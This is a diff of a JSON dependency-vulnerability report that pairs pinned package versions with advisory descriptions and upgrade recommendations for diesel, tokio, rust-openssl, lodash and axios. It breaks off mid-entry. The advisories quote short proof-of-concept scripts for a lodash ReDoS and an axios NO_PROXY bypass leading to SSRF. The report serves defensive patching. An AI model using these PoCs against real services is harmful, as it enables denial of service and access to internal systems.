@@ -1,6 +1,116 @@
 {
   "dependencies": [
     {
+      "name": "log",
+      "version": "0.4.16",
+      "ecosystem": "crates.io"
+    },
+    {
+      "name": "hyper",
+      "version": "0.14.18",
+      "ecosystem": "crates.io"
+    },
+    {
+      "name": "tokio",
+      "version": "1.17.0",
+      "ecosystem": "crates.io"
+    },
+    {
+      "name": "serde_json",
+      "version": "1.0.79",
+      "ecosystem": "crates.io"
+    },
+    {
+      "name": "diesel",
+      "version": "1.4.8",
+      "ecosystem": "crates.io"
+    },
+    {
+      "name": "env_logger",
+      "version": "0.9.0",
+      "ecosystem": "crates.io"
+    },
+    {
+      "name": "chrono",
+      "version": "0.4.19",
+      "ecosystem": "crates.io"
+    },
+    {
+      "name": "uuid",
+      "version": "0.8.2",
+      "ecosystem": "crates.io"
+    },
+    {
+      "name": "openssl",
+      "version": "0.10.38",
+      "ecosystem": "crates.io"
+    },
+    {
+      "name": "regex",
+      "version": "1.5.5",
+      "ecosystem": "crates.io"
+    },
+    {
+      "name": "actix-web",
+      "version": "4.0.1",
+      "ecosystem": "crates.io"
+    },
+    {
+      "name": "serde",
+      "version": "1.0.136",
+      "ecosystem": "crates.io"
+    },
+    {
+      "name": "reqwest",
+      "version": "0.11.10",
+      "ecosystem": "crates.io"
+    },
+    {
+      "name": "mockito",
+      "version": "0.31.0",
+      "ecosystem": "crates.io"
+    },
+    {
+      "name": "lodash",
+      "version": "4.17.20",
+      "ecosystem": "npm"
+    },
+    {
+      "name": "axios",
+      "version": "0.21.1",
+      "ecosystem": "npm"
+    },
+    {
+      "name": "jest",
+      "version": "27.0.0",
+      "ecosystem": "npm"
+    },
+    {
+      "name": "webpack",
+      "version": "5.50.0",
+      "ecosystem": "npm"
+    },
+    {
+      "name": "org.apache.logging.log4j:log4j-core",
+      "version": "${log4j.version}",
+      "ecosystem": "Maven"
+    },
+    {
+      "name": "com.fasterxml.jackson.core:jackson-databind",
+      "version": "${jackson.version}",
+      "ecosystem": "Maven"
+    },
+    {
+      "name": "org.springframework:spring-web",
+      "version": "${spring.version}",
+      "ecosystem": "Maven"
+    },
+    {
+      "name": "commons-collections:commons-collections",
+      "version": "3.2.1",
+      "ecosystem": "Maven"
+    },
+    {
       "name": "Django",
       "version": "2.2.10",
       "ecosystem": "PyPI"
@@ -14,9 +124,855 @@
       "name": "pytest",
       "version": "6.2.3",
       "ecosystem": "PyPI"
+    },
+    {
+      "name": "github.com/redis/go-redis/v9",
+      "version": "v9.19.0",
+      "ecosystem": "Go"
+    },
+    {
+      "name": "github.com/rogpeppe/go-internal",
+      "version": "v1.14.1",
+      "ecosystem": "Go"
+    },
+    {
+      "name": "github.com/schollz/progressbar/v3",
+      "version": "v3.19.0",
+      "ecosystem": "Go"
+    },
+    {
+      "name": "github.com/spf13/cobra",
+      "version": "v1.10.2",
+      "ecosystem": "Go"
+    },
+    {
+      "name": "go.uber.org/atomic",
+      "version": "v1.11.0",
+      "ecosystem": "Go"
+    },
+    {
+      "name": "golang.org/x/mod",
+      "version": "v0.21.0",
+      "ecosystem": "Go"
+    },
+    {
+      "name": "github.com/cespare/xxhash/v2",
+      "version": "v2.3.0",
+      "ecosystem": "Go"
+    },
+    {
+      "name": "github.com/inconshreveable/mousetrap",
+      "version": "v1.1.0",
+      "ecosystem": "Go"
+    },
+    {
+      "name": "github.com/mitchellh/colorstring",
+      "version": "v0.0.0-20190213212951-d06e56a500db",
+      "ecosystem": "Go"
+    },
+    {
+      "name": "github.com/pelletier/go-toml/v2",
+      "version": "v2.3.1",
+      "ecosystem": "Go"
+    },
+    {
+      "name": "github.com/rivo/uniseg",
+      "version": "v0.4.7",
+      "ecosystem": "Go"
+    },
+    {
+      "name": "github.com/spf13/pflag",
+      "version": "v1.0.10",
+      "ecosystem": "Go"
+    },
+    {
+      "name": "golang.org/x/sys",
+      "version": "v0.41.0",
+      "ecosystem": "Go"
+    },
+    {
+      "name": "golang.org/x/term",
+      "version": "v0.40.0",
+      "ecosystem": "Go"
     }
   ],
   "vulnerabilities": [
+    {
+      "cve_id": "GHSA-wq9x-qwcq-mmgf",
+      "published": "2024-08-23T18:51:20Z",
+      "lastModified": "2025-10-28T06:29:26.412332Z",
+      "current_version": "1.4.8",
+      "fixed_version": "2.2.3",
+      "description": "Diesel vulnerable to Binary Protocol Misinterpretation caused by Truncating or Overflowing Casts. The following presentation at this year\u0026#39;s DEF CON was brought to our attention on the Diesel Gitter Channel:\n\n\u0026gt; SQL Injection isn\u0026#39;t Dead: Smuggling Queries at the Protocol Level  \n\u0026gt; \u0026lt;http://web.archive.org/web/20240812130923/https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Paul%20Gerste%20-%20SQL%20Injection%20Isn\u0026#39;t%20Dead%20Smuggling%20Queries%20at%20the%20Protocol%20Level.pdf\u0026gt;  \n\u0026gt; (Archive link for posterity.)\nEssentially, encoding a value larger than 4GiB can cause the length prefix in the protocol to overflow, \ncausing the server to interpret the rest of the string as binary protocol commands or other data.\n\nIt appears Diesel _does_ perform truncating casts in a way that could be problematic, \nfor example: \u0026lt;https://github.com/diesel-rs/diesel/blob/ae82c4a5a133db65612b7436356f549bfecda1c7/diesel/src/pg/connection/stmt/mod.rs#L36\u0026gt;\n\nThis code has existed essentially since the beginning, \nso it is reasonable to assume that all published versions `\u0026lt;= 2.2.2` are affected.\n\n## Mitigation\n\nThe prefered migration to the outlined problem is to update to a Diesel version newer than 2.2.2, which includes \nfixes for the problem. \n\nAs always, you should make sure your application is validating untrustworthy user input. \nReject any input over 4 GiB, or any input that could _encode_ to a string longer than 4 GiB. \nDynamically built queries are also potentially problematic if it pushes the message size over this 4 GiB bound.\n\nFor web application backends, consider adding some middleware that limits the size of request bodies by default.\n\n## Resolution\n\nDiesel now uses `#[deny]` directives for the following Clippy lints:\n\n* [`cast_possible_truncation`](https://rust-lang.github.io/rust-clippy/master/#/cast_possible_truncation)\n* [`cast_possible_wrap`](https://rust-lang.github.io/rust-clippy/master/#/cast_possible_wrap)\n* [`cast_sign_loss`](https://rust-lang.github.io/rust-clippy/master/#/cast_sign_loss)\n\nto prevent casts that will lead to precision loss or other trunctations. Additionally we performed an \naudit of the relevant code.\n\nA fix is included in the `2.2.3` release.\n",
+      "severity": "CRITICAL",
+      "cvss_score": 9,
+      "affected_package": "diesel",
+      "recommendation": "Upgrade diesel from 1.4.8 to 2.2.3 to fix GHSA-wq9x-qwcq-mmgf. Update dependency version to 2.2.3 in Cargo.toml.",
+      "ecosystem": "crates.io"
+    },
+    {
+      "cve_id": "GHSA-4q83-7cq4-p6wg",
+      "published": "2023-02-04T00:30:37Z",
+      "lastModified": "2026-02-04T04:36:59.278362Z",
+      "current_version": "1.17.0",
+      "fixed_version": "1.18.5",
+      "description": "`tokio::io::ReadHalf\u0026lt;T\u0026gt;::unsplit` is Unsound. `tokio::io::ReadHalf\u0026lt;T\u0026gt;::unsplit` can violate the `Pin` contract\n\nThe soundness issue is described in the [tokio/issues#5372](https://github.com/tokio-rs/tokio/issues/5372)\n\nSpecific set of conditions needed to trigger an issue (a !Unpin type in ReadHalf)\nis unusual, combined with the difficulty of making any arbitrary use-after-free\nexploitable in Rust without doing a lot of careful alignment of data types in\nthe surrounding code.\n\nThe `tokio` feature `io-util` is also required to be enabled to trigger this\nsoundness issue.\n\nThanks to zachs18 reporting the issue to Tokio team responsibly and taiki-e\nand carllerche appropriately responding and fixing the soundness bug.\n\nTokio before 0.2.0 used `futures` 0.1 that did not have `Pin`, so it is not\naffected by this issue.\n",
+      "severity": "LOW",
+      "cvss_score": 2.5,
+      "affected_package": "tokio",
+      "recommendation": "Upgrade tokio from 1.17.0 to 1.18.5 to fix GHSA-4q83-7cq4-p6wg. Update dependency version to 1.18.5 in Cargo.toml.",
+      "ecosystem": "crates.io"
+    },
+    {
+      "cve_id": "CVE-2023-22466",
+      "published": "2023-01-06T21:40:58Z",
+      "lastModified": "2026-02-04T03:57:46.454817Z",
+      "current_version": "1.17.0",
+      "fixed_version": "1.18.4",
+      "description": "Tokio reject_remote_clients configuration may get dropped when creating a Windows named pipe. ### Impact\n\nWhen configuring a Windows named pipe server, setting `pipe_mode` will reset `reject_remote_clients` to `false`. If the application has previously configured `reject_remote_clients` to `true`, this effectively undoes the configuration. This also applies if `reject_remote_clients` is not explicitly set as this is the default configuration and is cleared by calling `pipe_mode`.\n\nRemote clients may only access the named pipe if the named pipe\u0026#39;s associated path is accessible via a publically shared folder (SMB).\n\n### Patches\n\nThe following versions have been patched:\n* 1.23.1\n* 1.20.3\n* 1.18.4\n\nThe fix will also be present in all releases starting from version 1.24.0.\n\nNamed pipes were introduced to Tokio in version 1.7.0, so releases older than 1.7.0 are not affected.\n\n### Workarounds\n\nEnsure that `pipe_mode` is set **first** after initializing a `ServerOptions`. For example:\n\n```rust\nlet mut opts = ServerOptions::new();\nopts.pipe_mode(PipeMode::Message);\nopts.reject_remote_clients(true);\n```\n\n### References\n\nhttps://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea#pipe_reject_remote_clients\n",
+      "severity": "LOW",
+      "cvss_score": 2,
+      "affected_package": "tokio",
+      "recommendation": "Upgrade tokio from 1.17.0 to 1.18.4 to fix CVE-2023-22466. Update dependency version to 1.18.4 in Cargo.toml.",
+      "ecosystem": "crates.io"
+    },
+    {
+      "cve_id": "GHSA-rr8g-9fpq-6wmg",
+      "published": "2025-04-07T21:12:50Z",
+      "lastModified": "2026-02-04T03:38:08.652126Z",
+      "current_version": "1.17.0",
+      "fixed_version": "1.38.2",
+      "description": "Tokio broadcast channel calls clone in parallel, but does not require `Sync`. The broadcast channel internally calls `clone` on the stored value when receiving it, and only requires `T:Send`. This means that using the broadcast channel with values that are `Send` but not `Sync` can trigger unsoundness if the `clone` implementation makes use of the value being `!Sync`.\n\nThank you to Austin Bonander for finding and reporting this issue.",
+      "severity": "LOW",
+      "cvss_score": 2.5,
+      "affected_package": "tokio",
+      "recommendation": "Upgrade tokio from 1.17.0 to 1.38.2 to fix GHSA-rr8g-9fpq-6wmg. Update dependency version to 1.38.2 in Cargo.toml.",
+      "ecosystem": "crates.io"
+    },
+    {
+      "cve_id": "GHSA-3gxf-9r58-2ghg",
+      "published": "2023-03-24T22:01:35Z",
+      "lastModified": "2023-11-08T04:14:38.793551Z",
+      "current_version": "0.10.38",
+      "fixed_version": "0.10.48",
+      "description": "`openssl` `X509NameBuilder::build` returned object is not thread safe. OpenSSL has a `modified` bit that it can set on on `X509_NAME` objects. If this bit is set then the object is not thread-safe even when it appears the code is not modifying the value.\n\nThanks to David Benjamin (Google) for reporting this issue.\n",
+      "severity": "MEDIUM",
+      "cvss_score": 5,
+      "affected_package": "openssl",
+      "recommendation": "Upgrade openssl from 0.10.38 to 0.10.48 to fix GHSA-3gxf-9r58-2ghg. Update dependency version to 0.10.48 in Cargo.toml.",
+      "ecosystem": "crates.io"
+    },
+    {
+      "cve_id": "GHSA-6hcf-g6gr-hhcr",
+      "published": "2023-03-24T22:01:23Z",
+      "lastModified": "2023-11-08T04:16:17.438606Z",
+      "current_version": "0.10.38",
+      "fixed_version": "0.10.48",
+      "description": "`openssl` `X509Extension::new` and `X509Extension::new_nid` null pointer dereference. These functions would crash when the context argument was None with certain extension types.\n\nThanks to David Benjamin (Google) for reporting this issue.\n",
+      "severity": "HIGH",
+      "cvss_score": 7.5,
+      "affected_package": "openssl",
+      "recommendation": "Upgrade openssl from 0.10.38 to 0.10.48 to fix GHSA-6hcf-g6gr-hhcr. Update dependency version to 0.10.48 in Cargo.toml.",
+      "ecosystem": "crates.io"
+    },
+    {
+      "cve_id": "CVE-2026-41678",
+      "published": "2026-04-22T21:17:32Z",
+      "lastModified": "2026-04-23T14:14:14.605149851Z",
+      "current_version": "0.10.38",
+      "fixed_version": "0.10.78",
+      "description": "rust-openssl has incorrect bounds assertion in aes key wrap. ### Summary\n``aes::unwrap_key()`` has an incorrect bounds assertion on the out buffer size, which can lead to out-of-bounds write.\n\n### Details\n``aes::unwrap_key()`` contains an incorrect assertion: it checks that `out.len() + 8 \u0026lt;= in_.len()`, but this condition is reversed. The intended invariant is `out.len() \u0026gt;= in_.len() - 8`, ensuring the output buffer is large enough.\n\nBecause of the inverted check, the function only accepts buffers at or below the minimum required size and rejects larger ones. If a smaller buffer is provided the function will write past the end of `out` by `in_.len() - 8 - out.len()` bytes, causing an out-of-bounds write from a safe public function.\n\n### Impact\nVulnerable applications using AES keywrap and allowing attacker controlled buffer sizes could have an attacker trigger an out-of-bounds write.",
+      "severity": "HIGH",
+      "cvss_score": 7.5,
+      "affected_package": "openssl",
+      "recommendation": "Upgrade openssl from 0.10.38 to 0.10.78 to fix CVE-2026-41678. Update dependency version to 0.10.78 in Cargo.toml.",
+      "ecosystem": "crates.io"
+    },
+    {
+      "cve_id": "GHSA-9qwg-crg9-m2vc",
+      "published": "2023-03-24T22:01:29Z",
+      "lastModified": "2023-11-08T04:18:04.563523Z",
+      "current_version": "0.10.38",
+      "fixed_version": "0.10.48",
+      "description": "`openssl` `SubjectAlternativeName` and `ExtendedKeyUsage::other` allow arbitrary file read. `SubjectAlternativeName` and `ExtendedKeyUsage` arguments were parsed using the OpenSSL function `X509V3_EXT_nconf`. This function parses all input using an OpenSSL mini-language which can perform arbitrary file reads.\n\nThanks to David Benjamin (Google) for reporting this issue.\n",
+      "severity": "HIGH",
+      "cvss_score": 7.5,
+      "affected_package": "openssl",
+      "recommendation": "Upgrade openssl from 0.10.38 to 0.10.48 to fix GHSA-9qwg-crg9-m2vc. Update dependency version to 0.10.48 in Cargo.toml.",
+      "ecosystem": "crates.io"
+    },
+    {
+      "cve_id": "GHSA-hppc-g8h3-xhp3",
+      "published": "2026-04-22T21:00:57Z",
+      "lastModified": "2026-04-23T14:14:14.734983270Z",
+      "current_version": "0.10.38",
+      "fixed_version": "0.10.78",
+      "description": "rust-openssl: Unchecked callback length in PSK/cookie trampolines leaks adjacent memory to peer. The FFI trampolines behind `SslContextBuilder::set_psk_client_callback`, `set_psk_server_callback`, `set_cookie_generate_cb`,  and `set_stateless_cookie_generate_cb` forwarded the user closure\u0026#39;s returned usize directly to OpenSSL without checking it against the `\u0026amp;mut [u8]` that was handed to the closure. This can lead to buffer overflows and other unintended consequences.",
+      "severity": "HIGH",
+      "cvss_score": 7.5,
+      "affected_package": "openssl",
+      "recommendation": "Upgrade openssl from 0.10.38 to 0.10.78 to fix GHSA-hppc-g8h3-xhp3. Update dependency version to 0.10.78 in Cargo.toml.",
+      "ecosystem": "crates.io"
+    },
+    {
+      "cve_id": "CVE-2026-41676",
+      "published": "2026-04-22T21:22:00Z",
+      "lastModified": "2026-04-23T14:14:15.151998542Z",
+      "current_version": "0.10.38",
+      "fixed_version": "0.10.78",
+      "description": "rust-openssl: Deriver::derive and PkeyCtxRef::derive can overflow short buffers on OpenSSL 1.1.1. `Deriver::derive` (and `PkeyCtxRef::derive`) sets `len = buf.len()` and passes it as the in/out length to `EVP_PKEY_derive`, relying on OpenSSL to honor it. On OpenSSL 1.1.x, X25519, X448, DH and HKDF-extract  ignore the incoming `*keylen`, unconditionally writing the full shared secret (32/56/prime-size bytes). A caller passing a short slice gets a heap/stack overflow from safe code. OpenSSL 3.x providers do check, so this only impacts older OpenSSL.",
+      "severity": "HIGH",
+      "cvss_score": 7.5,
+      "affected_package": "openssl",
+      "recommendation": "Upgrade openssl from 0.10.38 to 0.10.78 to fix CVE-2026-41676. Update dependency version to 0.10.78 in Cargo.toml.",
+      "ecosystem": "crates.io"
+    },
+    {
+      "cve_id": "GHSA-q445-7m23-qrmw",
+      "published": "2024-07-22T17:34:53Z",
+      "lastModified": "2026-02-04T03:45:37.982848Z",
+      "current_version": "0.10.38",
+      "fixed_version": "0.10.66",
+      "description": "openssl\u0026#39;s `MemBio::get_buf` has undefined behavior with empty buffers. Previously, `MemBio::get_buf` called `slice::from_raw_parts` with a null-pointer, which violates the functions invariants, leading to undefined behavior. In debug builds this would produce an assertion failure. This is now fixed.\n",
+      "severity": "LOW",
+      "cvss_score": 3,
+      "affected_package": "openssl",
+      "recommendation": "Upgrade openssl from 0.10.38 to 0.10.66 to fix GHSA-q445-7m23-qrmw. Update dependency version to 0.10.66 in Cargo.toml.",
+      "ecosystem": "crates.io"
+    },
+    {
+      "cve_id": "CVE-2025-24898",
+      "published": "2025-02-03T17:56:46Z",
+      "lastModified": "2026-02-04T03:34:30.758333Z",
+      "current_version": "0.10.38",
+      "fixed_version": "0.10.70",
+      "description": "rust-openssl ssl::select_next_proto use after free. ### Impact\n`ssl::select_next_proto` can return a slice pointing into the `server` argument\u0026#39;s buffer but with a lifetime bound to the `client` argument. In situations where the `server` buffer\u0026#39;s lifetime is shorter than the `client` buffer\u0026#39;s, this can cause a use after free. This could cause the server to crash or to return arbitrary memory contents to the client.\n\n### Patches\n`openssl` 0.10.70 fixes the signature of `ssl::select_next_proto` to properly constrain the output buffer\u0026#39;s lifetime to that of both input buffers.\n\n### Workarounds\nIn standard usage of `ssl::select_next_proto` in the callback passed to `SslContextBuilder::set_alpn_select_callback`, code is only affected if the `server` buffer is constructed *within* the callback. For example:\n\nNot vulnerable - the server buffer has a `\u0026#39;static` lifetime:\n```rust\nbuilder.set_alpn_select_callback(|_, client_protos| {\n    ssl::select_next_proto(b\u0026#34;\\x02h2\u0026#34;, client_protos).ok_or_else(AlpnError::NOACK)\n});\n```\n\nNot vulnerable - the server buffer outlives the handshake:\n```rust\nlet server_protos = b\u0026#34;\\x02h2\u0026#34;.to_vec();\nbuilder.set_alpn_select_callback(|_, client_protos| {\n    ssl::select_next_proto(\u0026amp;server_protos, client_protos).ok_or_else(AlpnError::NOACK)\n});\n```\n\nVulnerable - the server buffer is freed when the callback returns:\n```rust\nbuilder.set_alpn_select_callback(|_, client_protos| {\n    let server_protos = b\u0026#34;\\x02h2\u0026#34;.to_vec();\n    ssl::select_next_proto(\u0026amp;server_protos, client_protos).ok_or_else(AlpnError::NOACK)\n});\n```\n\n### References\nhttps://github.com/sfackler/rust-openssl/pull/2360",
+      "severity": "MEDIUM",
+      "cvss_score": 5,
+      "affected_package": "openssl",
+      "recommendation": "Upgrade openssl from 0.10.38 to 0.10.70 to fix CVE-2025-24898. Update dependency version to 0.10.70 in Cargo.toml.",
+      "ecosystem": "crates.io"
+    },
+    {
+      "cve_id": "CVE-2023-53159",
+      "published": "2023-06-21T22:07:52Z",
+      "lastModified": "2026-02-04T03:07:59.322133Z",
+      "current_version": "0.10.38",
+      "fixed_version": "0.10.55",
+      "description": "`openssl` `X509VerifyParamRef::set_host` buffer over-read. When this function was passed an empty string, `openssl` would attempt to call `strlen` on it, reading arbitrary memory until it reached a NUL byte.",
+      "severity": "MEDIUM",
+      "cvss_score": 4,
+      "affected_package": "openssl",
+      "recommendation": "Upgrade openssl from 0.10.38 to 0.10.55 to fix CVE-2023-53159. Update dependency version to 0.10.55 in Cargo.toml.",
+      "ecosystem": "crates.io"
+    },
+    {
+      "cve_id": "CVE-2026-41677",
+      "published": "2026-04-22T21:20:04Z",
+      "lastModified": "2026-04-23T14:14:15.453658366Z",
+      "current_version": "0.10.38",
+      "fixed_version": "0.10.78",
+      "description": "rust-opennssl has an Out-of-bounds read in PEM password callback when returning an oversized length. The `*_from_pem_callback` APIs did not validate the length returned by the user\u0026#39;s callback. A password callback that returns a value larger than the buffer it was given can cause some versions of OpenSSL to over-read this buffer. OpenSSL 3.x is not affected by this.",
+      "severity": "LOW",
+      "cvss_score": 2.5,
+      "affected_package": "openssl",
+      "recommendation": "Upgrade openssl from 0.10.38 to 0.10.78 to fix CVE-2026-41677. Update dependency version to 0.10.78 in Cargo.toml.",
+      "ecosystem": "crates.io"
+    },
+    {
+      "cve_id": "GHSA-xphf-cx8h-7q9g",
+      "published": "2023-11-28T20:51:08Z",
+      "lastModified": "2026-02-04T02:18:36.047186Z",
+      "current_version": "0.10.38",
+      "fixed_version": "0.10.60",
+      "description": "`openssl` `X509StoreRef::objects` is unsound. This function returned a reference into an OpenSSL datastructure, but there was no way to ensure OpenSSL would not mutate the datastructure behind one\u0026#39;s back.\n\nUse of this function should be replaced with `X509StoreRef::all_certificates`.\n",
+      "severity": "MEDIUM",
+      "cvss_score": 5,
+      "affected_package": "openssl",
+      "recommendation": "Upgrade openssl from 0.10.38 to 0.10.60 to fix GHSA-xphf-cx8h-7q9g. Update dependency version to 0.10.60 in Cargo.toml.",
+      "ecosystem": "crates.io"
+    },
+    {
+      "cve_id": "CVE-2020-28500",
+      "published": "2022-01-06T20:30:46Z",
+      "lastModified": "2025-09-29T21:12:31.102523Z",
+      "current_version": "4.17.20",
+      "fixed_version": "4.17.21",
+      "description": "Regular Expression Denial of Service (ReDoS) in lodash. All versions of package lodash prior to 4.17.21 are vulnerable to Regular Expression Denial of Service (ReDoS) via the `toNumber`, `trim` and `trimEnd` functions. \n\nSteps to reproduce (provided by reporter Liyuan Chen):\n```js\nvar lo = require(\u0026#39;lodash\u0026#39;);\n\nfunction build_blank(n) {\n    var ret = \u0026#34;1\u0026#34;\n    for (var i = 0; i \u0026lt; n; i++) {\n        ret += \u0026#34; \u0026#34;\n    }\n    return ret + \u0026#34;1\u0026#34;;\n}\nvar s = build_blank(50000) var time0 = Date.now();\nlo.trim(s) \nvar time_cost0 = Date.now() - time0;\nconsole.log(\u0026#34;time_cost0: \u0026#34; + time_cost0);\nvar time1 = Date.now();\nlo.toNumber(s) var time_cost1 = Date.now() - time1;\nconsole.log(\u0026#34;time_cost1: \u0026#34; + time_cost1);\nvar time2 = Date.now();\nlo.trimEnd(s);\nvar time_cost2 = Date.now() - time2;\nconsole.log(\u0026#34;time_cost2: \u0026#34; + time_cost2);\n```",
+      "severity": "LOW",
+      "cvss_score": 2,
+      "affected_package": "lodash",
+      "recommendation": "Upgrade lodash from 4.17.20 to 4.17.21 to fix CVE-2020-28500. Run: npm install lodash@4.17.21.",
+      "ecosystem": "npm"
+    },
+    {
+      "cve_id": "CVE-2021-23337",
+      "published": "2021-05-06T16:05:51Z",
+      "lastModified": "2025-08-12T21:55:57.719943Z",
+      "current_version": "4.17.20",
+      "fixed_version": "4.17.21",
+      "description": "Command Injection in lodash. `lodash` versions prior to 4.17.21 are vulnerable to Command Injection via the template function.",
+      "severity": "CRITICAL",
+      "cvss_score": 9,
+      "affected_package": "lodash",
+      "recommendation": "Upgrade lodash from 4.17.20 to 4.17.21 to fix CVE-2021-23337. Run: npm install lodash@4.17.21.",
+      "ecosystem": "npm"
+    },
+    {
+      "cve_id": "CVE-2026-2950",
+      "published": "2026-04-01T23:50:27Z",
+      "lastModified": "2026-04-02T17:29:51.565211556Z",
+      "current_version": "4.17.20",
+      "fixed_version": "4.18.0",
+      "description": "lodash vulnerable to Prototype Pollution via array path bypass in `_.unset` and `_.omit`. ### Impact\n\nLodash versions 4.17.23 and earlier are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. The fix for [CVE-2025-13465](https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as `Object.prototype`, `Number.prototype`, and `String.prototype`.\n\nThe issue permits deletion of prototype properties but does not allow overwriting their original behavior.\n\n### Patches\n\nThis issue is patched in 4.18.0.\n\n### Workarounds\n\nNone. Upgrade to the patched version.",
+      "severity": "LOW",
+      "cvss_score": 3,
+      "affected_package": "lodash",
+      "recommendation": "Upgrade lodash from 4.17.20 to 4.18.0 to fix CVE-2026-2950. Run: npm install lodash@4.18.0.",
+      "ecosystem": "npm"
+    },
+    {
+      "cve_id": "CVE-2026-4800",
+      "published": "2026-04-01T23:51:12Z",
+      "lastModified": "2026-04-02T17:29:57.498155673Z",
+      "current_version": "4.17.20",
+      "fixed_version": "4.18.0",
+      "description": "lodash vulnerable to Code Injection via `_.template` imports key names. ### Impact\n\nThe fix for [CVE-2021-23337](https://github.com/advisories/GHSA-35jh-r3h4-6jhm) added validation for the `variable` option in `_.template` but did not apply the same validation to `options.imports` key names. Both paths flow into the same `Function()` constructor sink.\n\nWhen an application passes untrusted input as `options.imports` key names, an attacker can inject default-parameter expressions that execute arbitrary code at template compilation time.\n\nAdditionally, `_.template` uses `assignInWith` to merge imports, which enumerates inherited properties via `for..in`. If `Object.prototype` has been polluted by any other vector, the polluted keys are copied into the imports object and passed to `Function()`.\n\n### Patches\n\nUsers should upgrade to version 4.18.0.\n\nThe fix applies two changes:\n1. Validate `importsKeys` against the existing `reForbiddenIdentifierChars` regex (same check already used for the `variable` option)\n2. Replace `assignInWith` with `assignWith` when merging imports, so only own properties are enumerated\n\n### Workarounds\n\nDo not pass untrusted input as key names in `options.imports`. Only use developer-controlled, static key names.",
+      "severity": "CRITICAL",
+      "cvss_score": 9,
+      "affected_package": "lodash",
+      "recommendation": "Upgrade lodash from 4.17.20 to 4.18.0 to fix CVE-2026-4800. Run: npm install lodash@4.18.0.",
+      "ecosystem": "npm"
+    },
+    {
+      "cve_id": "CVE-2025-13465",
+      "published": "2026-01-21T23:01:22Z",
+      "lastModified": "2026-02-04T03:38:10.856561Z",
+      "current_version": "4.17.20",
+      "fixed_version": "4.17.23",
+      "description": "Lodash has Prototype Pollution Vulnerability in `_.unset` and `_.omit` functions. ### Impact\n\nLodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes. \n\nThe issue permits deletion of properties but does not allow overwriting their original behavior.  \n\n### Patches\n\nThis issue is patched on 4.17.23.",
+      "severity": "LOW",
+      "cvss_score": 3,
+      "affected_package": "lodash",
+      "recommendation": "Upgrade lodash from 4.17.20 to 4.17.23 to fix CVE-2025-13465. Run: npm install lodash@4.17.23.",
+      "ecosystem": "npm"
+    },
+    {
+      "cve_id": "CVE-2025-62718",
+      "published": "2026-04-09T17:32:19Z",
+      "lastModified": "2026-04-16T19:02:54.706670Z",
+      "current_version": "0.21.1",
+      "fixed_version": "0.31.0",
+      "description": "Axios has a NO_PROXY Hostname Normalization Bypass that Leads to SSRF. Axios does not correctly handle hostname normalization when checking `NO_PROXY` rules.\nRequests to loopback addresses like `localhost.` (with a trailing dot) or `[::1]` (IPv6 literal) skip `NO_PROXY` matching and go through the configured proxy.\n\nThis goes against what developers expect and lets attackers force requests through a proxy, even if `NO_PROXY` is set up to protect loopback or internal services.\n\nAccording to [RFC 1034 §3.1](https://datatracker.ietf.org/doc/html/rfc1034#section-3.1) and [RFC 3986 §3.2.2](https://datatracker.ietf.org/doc/html/rfc3986#section-3.2.2), a hostname can have a trailing dot to show it is a fully qualified domain name (FQDN). At the DNS level, `localhost.` is the same as `localhost`. \nHowever, Axios does a literal string comparison instead of normalizing hostnames before checking `NO_PROXY`. This causes requests like `http://localhost.:8080/` and `http://[::1]:8080/` to be incorrectly proxied.\n\nThis issue leads to the possibility of proxy bypass and SSRF vulnerabilities allowing attackers to reach sensitive loopback or internal services despite the configured protections.\n\n---\n\n**PoC**\n\n```js\nimport http from \u0026#34;http\u0026#34;;\nimport axios from \u0026#34;axios\u0026#34;;\n\nconst proxyPort = 5300;\n\nhttp.createServer((req, res) =\u0026gt; {\n  console.log(\u0026#34;[PROXY] Got:\u0026#34;, req.method, req.url, \u0026#34;Host:\u0026#34;, req.headers.host);\n  res.writeHead(200, { \u0026#34;Content-Type\u0026#34;: \u0026#34;text/plain\u0026#34; });\n  res.end(\u0026#34;proxied\u0026#34;);\n}).listen(proxyPort, () =\u0026gt; console.log(\u0026#34;Proxy\u0026#34;, proxyPort));\n\nprocess.env.HTTP_PROXY = `http://127.0.0.1:${proxyPort}`;\nprocess.env.NO_PROXY = \u0026#34;localhost,127.0.0.1,::1\u0026#34;;\n\nasync function test(url) {\n  try {\n    await axios.get(url, { timeout: 2000 });\n  } catch {}\n}\n\nsetTimeout(async () =\u0026gt; {\n  console.log(\u0026#34;\\n[*] Testing http://localhost.:8080/\u0026#34;);\n  await test(\u0026#34;http://localhost.:8080/\u0026#34;); // goes through proxy\n\n  console.log(\u0026#34;\\n[*] Testing http://[::1]:8080/\u0026#34;);\n  await test(\u0026#34;http://[::1]:8080/\u0026#34;); // goes through proxy\n}, 500);\n```\n\n**Expected:** Requests bypass the proxy (direct to loopback).\n**Actual:** Proxy logs requests for `localhost.` and `[::1]`.\n\n---\n\n**Impact**\n\n* Applications that rely on `NO_PROXY=localhost,127.0.0.1,::1` for protecting loopback/internal access are vulnerable.\n* Attackers controlling request URLs can:\n\n  * Force Axios to send local traffic through an attacker-controlled proxy.\n  * Bypass SSRF mitigations relying on NO\\_PROXY rules.\n  * Potentially exfiltrate sensitive responses from internal services via the proxy.\n  \n  \n---\n\n**Affected Versions**\n\n* Confirmed on Axios **1.12.2** (latest at time of testing).\n* affects all versions that rely on Axios’ current `NO_PROXY` evaluation.\n\n---\n\n**Remediation**\nAxios should normalize hostnames before evaluating `NO_PROXY`, including:\n\n* Strip trailing dots from hostnames (per RFC 3986).\n* Normalize IPv6 literals by removing brackets for matching.",
+      "severity": "MEDIUM",
+      "cvss_score": 4,
+      "affected_package": "axios",
+      "recommendation": "Upgrade axios from 0.21.1 to 0.31.0 to fix CVE-2025-62718. Run: npm install axios@0.31.0.",
+      "ecosystem": "npm"
+    },
+    {
+      "cve_id": "CVE-2026-25639",
+      "published": "2026-02-09T17:46:14Z",
+      "lastModified": "2026-03-03T05:27:19.212052Z",
+      "current_version": "0.21.1",
+      "fixed_version": "0.30.3",
